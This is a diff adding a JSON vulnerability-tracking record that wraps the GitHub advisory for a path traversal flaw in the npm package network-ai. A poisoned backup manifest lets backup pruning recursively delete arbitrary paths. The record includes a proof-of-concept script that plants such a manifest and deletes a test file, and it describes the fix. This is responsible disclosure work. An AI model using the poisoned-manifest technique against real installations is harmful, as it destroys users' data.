@@ -1,0 +1,55 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/87920408?v=4\", \"events_url\": \"https://api.github.com/users/sondt99/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/sondt99/followers\", \"following_url\": \"https://api.github.com/users/sondt99/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/sondt99/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/sondt99\", \"id\": 87920408, \"login\": \"sondt99\", \"node_id\": \"MDQ6VXNlcjg3OTIwNDA4\", \"organizations_url\": \"https://api.github.com/users/sondt99/orgs\", \"received_events_url\": \"https://api.github.com/users/sondt99/received_events\", \"repos_url\": \"https://api.github.com/users/sondt99/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/sondt99/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/sondt99/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/sondt99\", \"user_view_type\": \"public\"}}], \"cve_id\": null, \"cvss\": {\"score\": 7.1, \"vector_string\": \"CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 7.1, \"vector_string\": \"CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-22\", \"name\": \"Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\"}, {\"cwe_id\": \"CWE-73\", \"name\": \"External Control of File Name or Path\"}], \"description\": \"### Summary\\n`EnvironmentManager.listBackups()` reads each backup's `_manifest.json` and trusts the manifest's `path` field. `EnvironmentManager.pruneBackups()` later passes that trusted `entry.path` directly to `rmSync(entry.path, { recursive: true, force: true })`.\\n\\nAn attacker who can place or modify a manifest inside `data/<env>/.backups/<name>/_manifest.json` can cause `network-ai env backup prune --env <env> --keep <n>` or any code path invoking `pruneBackups()` to recursively delete an arbitrary path accessible to the Network-AI process user. Confirmed in Network-AI 5.12.1.\\n\\n### Details\\n`listBackups()` trusts manifest content from disk:\\n\\n```ts\\nfor (const name of readdirSync(backupsDir)) {\\n  const manifest = join(backupsDir, name, '_manifest.json');\\n  if (existsSync(manifest)) {\\n    try {\\n      const entry = JSON.parse(readFileSync(manifest, 'utf-8')) as BackupEntry;\\n      entries.push(entry);\\n    } catch { /* corrupt manifest, skip */ }\\n  }\\n}\\n```\\n\\n`pruneBackups()` uses the attacker-controlled `entry.path` as the deletion target:\\n\\n```ts\\nconst toDelete = all.slice(keep);\\nlet deleted = 0;\\nfor (const entry of toDelete) {\\n  try {\\n    rmSync(entry.path, { recursive: true, force: true });\\n    deleted++;\\n  } catch { /* ignore */ }\\n}\\n```\\n\\nDefault CLI reachability exists through `network-ai env backup prune --env <env> --keep <n>`.\\n\\nAffected source evidence:\\n\\n- `lib/env-manager.ts:505-523` — reads trusted backup entries from `_manifest.json`.\\n- `lib/env-manager.ts:529-541` — recursively deletes `entry.path`.\\n- `bin/cli.ts:464-472` — default CLI exposes backup pruning.\\n\\n### PoC\\nThis PoC uses only a temporary directory and deletes only a temporary file:\\n\\n```bash\\nTMP=$(mktemp -d)\\nTMPBASE=\\\"$TMP\\\" node -r ts-node/register/transpile-only - <<'TS'\\nconst { EnvironmentManager } = require('./lib/env-manager');\\nconst fs = require('fs');\\nconst path = require('path');\\nconst base = process.env.TMPBASE;\\n\\nconst mgr = new EnvironmentManager(path.join(base, 'data'), {\\n  chain: ['dev', 'st'],\\n  gates: { dev: 'auto', st: 'auto' },\\n});\\n\\nmgr.init('dev');\\nfs.writeFileSync(path.join(base, 'victim.txt'), 'safe');\\n\\nconst backupsDir = path.join(base, 'data', 'dev', '.backups');\\nfs.mkdirSync(path.join(backupsDir, 'evil'), { recursive: true });\\nfs.writeFileSync(\\n  path.join(backupsDir, 'evil', '_manifest.json'),\\n  JSON.stringify({\\n    backupId: 'evil',\\n    env: 'dev',\\n    timestamp: '2000-01-01T00:00:00.000Z',\\n    sizeBytes: 0,\\n    path: path.join(base, 'victim.txt'),\\n  })\\n);\\n\\nconsole.log(JSON.stringify({\\n  before: fs.existsSync(path.join(base, 'victim.txt')),\\n  deleted: mgr.pruneBackups('dev', 0),\\n  after: fs.existsSync(path.join(base, 'victim.txt')),\\n}, null, 2));\\n\\nfs.rmSync(base, { recursive: true, force: true });\\nTS\\n```\\n\\nObserved result: `before` is `true`, `deleted` is `1`, and `after` is `false`, proving deletion occurred outside `data/dev/.backups`.\\n\\n### Impact\\nAn attacker with write access to the Network-AI data directory can cause recursive deletion of arbitrary filesystem paths accessible to the Network-AI process user when backup pruning runs. This can delete project files, data directories, or other process-writable paths, causing data loss and denial of service. No RCE chain was confirmed.\\n\\n\\n---\\n\\n### Resolution (maintainer)\\n\\n**Fixed in [v5.12.2](https://github.com/Jovancoding/Network-AI/releases/tag/v5.12.2) (commit `a59c13a`).** Install: `npm install network-ai@5.12.2` — published to npm with provenance.\\n\\n`pruneBackups()` no longer passes `entry.path` from the on-disk manifest to `rmSync`. The deletion path is recomputed from a format-validated `entry.backupId`, and a `dirname` containment check confines deletion to exactly one level under the backups directory. A poisoned manifest (e.g. `\\\"path\\\": \\\"/\\\"`) is now inert.\\n\\nAll 3,269 tests pass against the patched build. Thanks to @sondt99 for the responsible disclosure.\", \"ghsa_id\": \"GHSA-2fmp-9rvw-hc96\", \"github_reviewed_at\": \"2026-06-19T21:42:26Z\", \"html_url\": \"https://github.com/advisories/GHSA-2fmp-9rvw-hc96\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-2fmp-9rvw-hc96\"}], \"nvd_published_at\": null, \"published_at\": \"2026-06-19T21:42:26Z\", \"references\": [\"https://github.com/Jovancoding/Network-AI/security/advisories/GHSA-2fmp-9rvw-hc96\", \"https://github.com/Jovancoding/Network-AI/commit/a59c13a1f0ce0e8a0779a90343eef92fac5ab4c3\", \"https://github.com/Jovancoding/Network-AI/releases/tag/v5.12.2\", \"https://github.com/advisories/GHSA-2fmp-9rvw-hc96\"], \"repository_advisory_url\": \"https://api.github.com/repos/Jovancoding/Network-AI/security-advisories/GHSA-2fmp-9rvw-hc96\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/Jovancoding/Network-AI\", \"summary\": \"Network-AI: Poisoned environment backup manifest allows arbitrary recursive deletion during backup pruning\", \"type\": \"reviewed\", \"updated_at\": \"2026-06-19T21:42:30Z\", \"url\": \"https://api.github.com/advisories/GHSA-2fmp-9rvw-hc96\", \"vulnerabilities\": [{\"first_patched_version\": \"5.12.2\", \"package\": {\"ecosystem\": \"npm\", \"name\": \"network-ai\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 5.12.1\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-2fmp-9rvw-hc96",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "network-ai: <= 5.12.1"
+    ],
+    "authentication_required": true,
+    "cves": [],
+    "cvss_score": 7.1,
+    "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "network-ai"
+    ],
+    "remote": false,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-20T19:51:57.713410Z",
+  "provenance": {
+    "content_sha256": "3d91a5bf6d7556a1299ff4cd020b8ae74150c63cdb9d78740a69fd228ca58a51",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-06-19T21:42:26Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-2fmp-9rvw-hc96",
+  "status": "active",
+  "title": "Network-AI: Poisoned environment backup manifest allows arbitrary recursive deletion during backup pruning",
+  "updated_at": "2026-06-19T21:42:30Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-2fmp-9rvw-hc96"
+}
